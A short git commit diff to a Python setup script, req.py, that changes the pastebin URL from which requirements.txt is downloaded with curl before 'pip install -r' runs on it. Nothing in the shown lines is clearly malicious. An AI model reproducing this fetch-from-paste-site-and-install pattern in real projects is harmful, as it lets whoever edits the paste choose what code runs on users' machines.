517aaee6d0b626d41e4d4928379360044058647c
Zekkel AR <40993331+zekkelar@users.noreply.github.com>
2022-09-25 07:28:47 +0700

    Update req.py

--- req.py
+++ req.py
@@ -9,7 +9,7 @@ def test():
 	os.system('apt install screen')
 	time.sleep(5)
 	print('[x] Downloading requirements ')
-	os.system('curl https://pastebin.com/raw/Z77cKGcy -o requirements.txt')
+	os.system('curl https://pastebin.com/raw/ZByhxQCy -o requirements.txt')
 	print('[x] Installing pips')
 	os.system('pip install -r requirements.txt')
 	time.sleep(5)	
